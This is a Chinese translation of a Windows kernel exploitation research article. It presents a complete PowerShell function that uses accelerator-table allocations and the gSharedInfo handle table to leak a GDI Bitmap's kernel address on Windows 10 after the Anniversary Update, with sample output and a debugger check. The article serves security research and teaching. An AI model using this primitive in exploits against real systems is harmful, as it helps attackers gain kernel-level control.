
# Bitmap轶事：Windows 10纪念版后的GDI对象泄露

## 介绍

开始之前，先要吹一波[Nicolas Economou](https://bbs.kanxue.com/elink@67aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3e0X3W2U0L8@1g2U0L8$3&6G2L8h3!0#2), Diego Juarez和[KeenLab](<https://bbs.kanxue.com/elink@56eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2W2L8W2)9#2k6X3I4S2j5R3`.`.)>)。是你们全力推动了Windows内核exp技术的发展，又把这些晦涩的知识点慷慨的分享在了众所周知的社区。在Windows 10纪念版(Build 1607)的补丁中，微软打上了一个非常重要的信息泄露的补丁，它此前常用于揭示内核空间中的`Bitmap`对象的地址。本文讨论了一种应用于纪念版本后的`Bitmap`对象泄露方法。该方法首次被Nicolas Economou和Diego Juarez在2016年的Ekoparty演讲中提出，标题为 "[Abusing GDI for ring0 exploit primitives: Reloaded](<https://bbs.kanxue.com/elink@2b0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1k6X3K9h3I4W2M7#2)9J5c8Y4m8#2j5X3I4A6j5$3q4@1K9h3!0F1M7#2)9J5c8U0t1H3x3e0k6Q4x3V1j5I4x3q4)9J5c8V1q4T1N6i4y4A6L8X3N6Q4x3X3c8s2c8p5W2Q4x3X3c8d9k6h3I4G2j5h3c8W2k6q4)9J5k6r3g2C8L8%4m8S2M7Y4c8&6i4K6u0V1x3U0l9I4y4W2)9#2k6U0m8Q4x3X3g2H3k6r3j5`.)>)"。

## 资源

下面的资源提供了bitmap在内核exp上下文中使用的背景信息。

- [Abusing GDI for ring0 exploit primitives](<https://bbs.kanxue.com/elink@489K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3j5h3u0#2M7$3W2F1k6#2)9J5k6r3N6V1K9g2)9J5k6r3k6G2M7W2)9J5k6s2u0A6L8X3M7H3i4K6u0V1k6i4S2H3L8r3!0A6N6q4)9J5k6s2m8J5K9h3#2A6N6r3W2$3k6i4x3`.)>)([@CoreSecurity](https://bbs.kanxue.com/elink@6d4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3b7$3!0J5k6g2y4W2j5%4g2J5K9i4c8&6))
- [Abusing GDI Reloaded](<https://bbs.kanxue.com/elink@9e4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1k6X3K9h3I4W2M7#2)9J5c8Y4m8#2j5X3I4A6j5$3q4@1K9h3!0F1M7#2)9J5c8U0t1H3x3e0k6Q4x3V1j5I4x3q4)9J5c8V1q4T1N6i4y4A6L8X3N6Q4x3X3c8s2c8p5W2Q4x3X3c8d9k6h3I4G2j5h3c8W2k6q4)9J5k6r3g2C8L8%4m8S2M7Y4c8&6i4K6u0V1x3U0l9I4y4W2)9#2k6U0m8Q4x3X3g2H3k6r3j5`.)>)([@CoreSecurity](https://bbs.kanxue.com/elink@051K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3b7$3!0J5k6g2y4W2j5%4g2J5K9i4c8&6))
- [This Time Font hunt you down in 4 bytes](<https://bbs.kanxue.com/elink@f5dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4y4D9K9h3c8W2M7$3S2S2M7X3g2Q4x3X3g2F1k6i4c8Q4x3V1k6b7k6i4c8W2M7V1S2D9j5i4k6S2N6s2W2Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1k6i4S2H3L8r3!0A6N6r3q4@1K9h3!0F1i4K6u0V1N6r3S2A6M7#2)9J5k6s2c8A6L8h3g2Q4x3X3c8X3L8$3&6@1i4K6u0V1K9s2g2F1N6q4)9J5k6s2W2G2N6g2)9J5k6r3c8G2N6$3&6Q4x3X3c8A6L8W2)9J5k6o6c8Q4x3X3c8T1P5i4c8W2M7H3`.`.)>)([@keen\_lab](<https://bbs.kanxue.com/elink@ee7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2W2L8W2)9#2k6X3I4S2j5R3`.`.)>))

## 背景

```powershell
function Stage-gSharedInfoBitmap {
<#
.SYNOPSIS
Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (+post anniversary).
.DESCRIPTION
Author: Ruben Boonen (@FuzzySec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.EXAMPLE
PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl
BitmapKernelObj : -7692235059200
BitmappvScan0 : -7692235059120
BitmapHandle : 1845828432
PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
FFFFF901030FF000
#>
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
public static class gSharedInfoBitmap
{
[DllImport("gdi32.dll")]
public static extern IntPtr CreateBitmap(
int nWidth,
int nHeight,
uint cPlanes,
uint cBitsPerPel,
IntPtr lpvBits);
[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
public static extern IntPtr LoadLibrary(
string lpFileName);
[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
public static extern IntPtr GetProcAddress(
IntPtr hModule,
string procName);
[DllImport("user32.dll")]
public static extern IntPtr CreateAcceleratorTable(
IntPtr lpaccl,
int cEntries);
[DllImport("user32.dll")]
public static extern bool DestroyAcceleratorTable(
IntPtr hAccel);
}
"@
# Check Arch
if ([System.IntPtr]::Size -eq 4) {
$x32 = 1
}
function Create-AcceleratorTable {
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
$User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
$gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
if ($x32){
$gSharedInfo = $gSharedInfo.ToInt32()
} else {
$gSharedInfo = $gSharedInfo.ToInt64()
}
$aheList = $gSharedInfo + [System.IntPtr]::Size
if ($x32){
$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)\*0xc # \_HANDLEENTRY.Size = 0xC
$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
} else {
$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)\*0x18 # \_HANDLEENTRY.Size = 0x18
$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
}
$Result = @()
$HashTable = @{
Handle = $AccelHandle
KernelObj = $phead
}
$Object = New-Object PSObject -Property $HashTable
$Result += $Object
$Result
}
function Destroy-AcceleratorTable {
param ($Hanlde)
$CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
}
$KernelArray = @()
for ($i=0;$i -lt 20;$i++) {
$KernelArray += Create-AcceleratorTable
if ($KernelArray.Length -gt 1) {
if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50\*2\*4)
$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
break
}
}
Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
}
$BitMapObject = @()
$HashTable = @{
BitmapHandle = $BitmapHandle
BitmapKernelObj = $($KernelArray[$i].KernelObj)
BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
}
$Object = New-Object PSObject -Property $HashTable
$BitMapObject += $Object
$BitMapObject
}
```

该函数的输出如下。

![](upload/attach/201803/530966_HQCG7XJKP3XXPEG.jpg)

为了核实这一地址（accelerator table此前用到所用）确实包含了我们的bitmap，可以在KD中执行`!pool ADDRESS`。

![](upload/attach/201803/530966_6QV4VYPSAKVP2TG.jpg)

## 结论

有效的exp缓解措施需要一定的不同策略，其中包含了漏洞补丁、保护增强以及消除已知的exp技术。微软在后两类策略中持之以恒的做出了努力，它们富有成效且大大的增强了Windows内核的安全性。这些提升增加了内核exp开发的难度，且在某些情况下完全消除了这一类bug。然而，如本文所展示，新的技术会被挖掘出来，道高一尺魔高一丈！

关于Windows 10纪念版补丁中的新缓解措施的更多细节可以在这里找到[here](<elink@c05K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1L8r3q4U0K9$3S2S2N6q4)9J5k6h3y4G2L8g2)9J5c8X3c8G2j5%4y4Q4x3V1k6#2M7#2)9J5k6o6p5$3i4K6u0r3L8h3q4@1k6i4u0A6j5h3I4K6i4K6u0r3N6i4y4Q4x3X3b7I4y4W2)9J5k6q4N6W2M7%4c8G2L8W2)9J5k6q4N6A6L8X3c8G2N6%4y4Q4x3X3b7I4x3q4)9J5k6p5#2A6N6r3W2Y4j5i4c8A6L8$3&6Q4x3X3c8u0L8i4m8J5L8%4k6W2L8h3g2F1N6s2y4Q4x3X3g2H3k6r3j5`.">)。

原文链接：[0ceK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9j5h3u0K6i4K6u0W2L8i4N6J5K9h3&6X3L8%4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5$3!0E0i4K6u0r3j5X3I4G2k6#2)9J5c8X3q4Q4x3X3c8@1j5h3I4W2i4K6u0V1L8$3k6Q4x3X3c8T1K9i4c8E0j5i4m8K6i4K6u0r3](https://bbs.kanxue.com/elink@84cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9j5h3u0K6i4K6u0W2L8i4N6J5K9h3&6X3L8%4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5$3!0E0i4K6u0r3j5X3I4G2k6#2)9J5c8X3q4Q4x3X3c8@1j5h3I4W2i4K6u0V1L8$3k6Q4x3X3c8T1K9i4c8E0j5i4m8K6i4K6u0r3)
